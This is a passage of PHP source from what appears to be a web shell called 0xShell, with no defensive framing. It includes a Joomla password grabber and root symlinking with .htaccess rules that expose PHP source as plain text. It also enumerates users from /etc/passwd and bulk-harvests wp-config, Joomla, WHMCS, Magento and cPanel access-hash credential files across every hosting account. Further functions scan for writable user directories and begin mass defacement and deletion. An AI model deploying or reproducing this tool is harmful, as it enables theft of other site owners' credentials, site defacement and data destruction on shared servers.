        <input type='submit' style='width: 450px;' name='grabpass' value='Hajar!!'>
        </form></center>";
}   else {
        echo "<center><h1>Joomla Auto Change User 2</h1>
        <form method='post'>
        Link Config: <br>
        <input type='text' name='linkconf' height='10' size='50' placeholder='http://link.com/0xsym/'><br>
        <input type='submit' style='width: 450px;' name='gass' value='Hajar!!'>
        </form></center>";
    }
if($_POST['grabpass']) {
    

        $link = explode("\r\n", $_POST['link']);
        echo '<textarea>';
        foreach($link as $dir_config) {
        	$ambilpass=ambil_password($dir_config);
        	$hh=@file_get_contents("password.txt");
        	@file_put_contents("password.txt", $hh.$ambilpass);
           
echo $ambilpass;


                    }
        echo '</textarea>';
    }   
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'symlink')) {
	
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("0xsymlink",0777);
@chdir("0xsymlink");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);
@fclose($fp3);
echo "
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/0xsymlink/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>"; 
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=$etcpasswd;
if ($TEST){
@mkdir("0xsymlink",0777);
@chdir("0xsymlink");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 // $file=$etcpasswd;
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/0xsymlink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";
}else{

 	if($os != "Windows"){
 		@mkdir("0xsymlink",0777);
 		@chdir("0xsymlink");
 		@exe("ln -s / root");
 		$file3 = '
Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 = 
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file = 
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/0xsymlink/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else 
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }    
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'config')) {
	if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
	if($_POST){	if($_POST['tipe'] == 'grabsymv') {
		@mkdir("0xsymv", 0777);
exe("ln -s / 0xsymv/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("0xsymv/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$usera = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php 0xsymv/".$usera."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php 0xsymv/".$usera."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php 0xsymv/".$usera."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php 0xsymv/".$usera."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php 0xsymv/".$usera."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php 0xsymv/".$usera."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml 0xsymv/".$usera."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php 0xsymv/".$usera."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php 0xsymv/".$usera."-Ellislab.txt"); 
}}}
if($_POST['tipe'] == 'grabsym') {
@mkdir("0xsym", 0777);
@symlink("/","0xsym/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("0xsym/.htaccess",$htaccess);}
if($_POST['tipe'] == 'grabsym404') {
@mkdir("0xsym404", 0777);
@symlink("/","0xsym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=* 
AddIcon 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAFUSURBVDiNpZK9SgNBFIXPvXNndjcRopX4U4kWVr5AChU7H8BSfItAHkB9CXsrW0GwEQtRwVKMRtAU8ZcYWaNmM2OxqyyiYZdcGIaZ4Z77MeeQcw6DFA/UDUAAYHHj8hOATj9oRSe2Z1f2KjP1fgLknMPS5lW0Vi4pZopvHXDW+IhOr99gXTzkr9qvTBMtrNd8AsLVcomZKDP61kELihGIJ9QBgO2jdsIE/Jb5OacGFAwDQEeMEOZnh1EqMChtSB8a64BW2MNh7QVihCGKcNHswmZ0lAkYHxF4QhBPCKIYRU9l605KmGCEIUYztCYMBfkEjGZ4OiHwRQF+vkQG+ptACIFREJVPQAvFf+BrjoyQ+CZfqq118DRFEhjebbbel6dGiyTqf+vSrkaRQ/0utL7mHXl9vq+eP3Unbh/H5gDKiOF67YebY0dSJcRBm0z2rFl2yWp8AVDIW32da7pLAAAAAElFTkSuQmCC' ^^DIRECTORY^^
DefaultIcon 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='
IndexIgnore *.txt404
IndexStyleSheet 'https://0x1999.github.io/0xShell/style/melex.css'
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*0xsym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("0xsym404/.htaccess",$htaccess);
}
if($_POST['tipe'] == 'grab') {
						mkdir("0xgrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("0xgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_cox) {
$grab_config = array(
"/home/$user_cox/.accesshash" => "WHM-accesshash",
"/home/$user_cox/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_cox/public_html/forum/config.php" => "phpBB",
"/home/$user_cox/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_cox/public_html/config/settings.inc.php" => "Shop",
"/home/$user_cox/public_html/app/etc/local.xml" => "Magento",
"/home/$user_cox/public_html/admin/config.php" => "OpenCart",
"/home/$user_cox/public_html/application/config/database.php" => "Ellislab",
"/home/$user_cox/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_cox/public_html/includes/config.php" => "Vbulletin",
"/home/$user_cox/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_cox/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_cox/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_cox/public_html/inc/config.php" => "MyBB",
"/home/$user_cox/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_cox/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_cox/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_cox/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_cox/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_cox/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_cox/public_html/inc/conf_global.php" => "IPB",
"/home/$user_cox/public_html/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_cox/public_html/configuration.php" => "Joomla",
"/home/$user_cox/public_html/blog/configuration.php" => "Joomla",
"/home/$user_cox/public_html/submitticket.php" => "^WHMCS",
"/home/$user_cox/public_html/cms/configuration.php" => "Joomla",
"/home/$user_cox/public_html/beta/configuration.php" => "Joomla",
"/home/$user_cox/public_html/portal/configuration.php" => "Joomla",
"/home/$user_cox/public_html/site/configuration.php" => "Joomla",
"/home/$user_cox/public_html/main/configuration.php" => "Joomla",
"/home/$user_cox/public_html/home/configuration.php" => "Joomla",
"/home/$user_cox/public_html/demo/configuration.php" => "Joomla",
"/home/$user_cox/public_html/test/configuration.php" => "Joomla",
"/home/$user_cox/public_html/v1/configuration.php" => "Joomla",
"/home/$user_cox/public_html/v2/configuration.php" => "Joomla",
"/home/$user_cox/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_cox/public_html/new/configuration.php" => "Joomla",
"/home/$user_cox/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_cox/public_html/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_cox/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_cox/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_cox/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_cox/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_cox/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_cox/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_cox/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['tipe'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("0xgrab/$user_cox-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['tipe'] == 'grabsym') {
@symlink($config,"0xsym/".$user_cox."-".$nama_config.".txt");
}
if($_POST['tipe'] == 'grabsym404') {
$sym404=symlink($config,"0xsym404/".$user_cox."-".$nama_config.".txt");
if($sym404){
	@mkdir("0xsym404/".$user_cox."-".$nama_config.".txt404", 0777);
	$xsym404="Options Indexes FollowSymLinks
DirectoryIndex jancox.htm
HeaderName 0x.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *
IndexStyleSheet 'https://0x1999.github.io/0xShell/style/melex.css'";

@file_put_contents("0xsym404/".$user_cox."-".$nama_config.".txt404/.htaccess",$xsym404);

@symlink($config,"0xsym404/".$user_cox."-".$nama_config.".txt404/0x.txt");

	}

}

                    }     
		}  if($_POST['tipe'] == 'grab') {
            echo "<center><a href='?dir=$dir/0xgrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['tipe'] == 'grabsym404') {
        echo "<center>
<a href=\"0xsym404/root/\">Root Server</a>
<br><a href=\"0xsym404/\">Configurations</a></center>";
    }
     if($_POST['tipe'] == 'grabsym') {
echo "<center>
<a href=\"0xsym/root/\">Root Server</a>
<br><a href=\"0xsym/\">Configurations</a></center>";
			}if($_POST['tipe'] == 'grabsymv') {
echo "<center>
<a href=\"0xsymv/root/\">Root Server</a>
<br><a href=\"0xsymv/\">Configurations</a></center>";
			}
		
		
		}else{
        echo "<form method=\"post\" action=\"\"><center>
        <select class=\"select\" name=\"tipe\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"grabsym\">Symlink Config</option>
		<option value=\"grabsym404\">Symlink Config 404</option>
		<option value=\"grabsymv\">VHosts Symlink Config</option>
		</center></select>
		<br>\n";
		if(!$etcpasswd){
			echo "<textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		for($uid=0;$uid<60000;$uid++){
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
	} else {
		echo "<textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
		echo $etcpasswd;
		echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";

	}
	}


}
elseif(isset($_GET['do']) && ($_GET['do'] == 'cekjum')) {
  echo '<form method="post" action="" style="float: left;">
    Dir : 
    <input size="30" name="cekjum" height="10" type="text"><input name="submit" value=">>" type="submit">
    </form><br><br>';
    if ($_POST){
      echo cekjum($_REQUEST['cekjum']);
    } else {
      echo cekjum($_GET['cekjum']);
    }
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'jump')) {
    $i = 0;
    echo "<pre><div class='margin: 5px auto;'>";
    $etc = fopen("/etc/passwd", "r");
    
    while($passwd = fgets($etc)) {
        if($passwd == '' || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {

            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
            foreach($user_jumping[1] as $userjum) {
                $userjumdir = "/home/$userjum/public_html";
                $perm = permissions($userjumdir);
                $perm = w($userjumdir,$perm);

                if(is_readable($userjumdir)) {
                	$i++;
                    $jrw = "<a>[<font color=lime>R</font>]  [$perm] </a><a href='?dir=$userjumdir'><font color=gold>$userjumdir</font></a> <a href='?do=cekjum&cekjum=$userjumdir' target='_blank'>Check</a><br>";
                    if(is_writable($userjumdir)) {
                    $jrw = "<a>[<font color=lime>RW</font>] [$perm] </a><a href='?dir=$userjumdir'><font color=gold>$userjumdir</font></a> <a href='?do=cekjum&cekjum=$userjumdir' target='_blank'>Check</a><br>";
                    }
                    echo $jrw;
                }
            }
        }
    }
    if($i == 0) { 
    } else {
        echo "<br>Total ada ".$i." Kimcil di ".gethostbyname($_SERVER['HTTP_HOST'])."";
    }
    echo "</div></pre>";
}
	elseif(isset($_GET['do']) && ($_GET['do'] == 'mass_deface')) {
    echo "<center><form action=\"\" method=\"post\">\n";
    $dirr=$_POST['d_dir'];
    $index = $_POST["script"];
    $index = str_replace('"',"'",$index);
    $index = stripslashes($index);
    function edit_file($file,$index){
        if (is_writable($file)) {
        clear_fill($file,$index);
        echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
        } 
        else {
            echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
            }
            }
    function hapus_massal($dir,$namafile) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    if(file_exists("$dir/$namafile")) {
                        unlink("$dir/$namafile");
                    }
                } elseif($dirb === '..') {
                    if(file_exists("".dirname($dir)."/$namafile")) {
                        unlink("".dirname($dir)."/$namafile");
                    }
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            if(file_exists($lokasi)) {
                                echo "[<font color=lime>DELETED</font>] $lokasi<br>";
                                unlink($lokasi);
                                $idx = hapus_massal($dirc,$namafile);
                            }
                        }
                    }
                }
            }
        }
    }
    function clear_fill($file,$index){
        if(file_exists($file)){
            $handle = fopen($file,'w');
            fwrite($handle,'');
            fwrite($handle,$index);
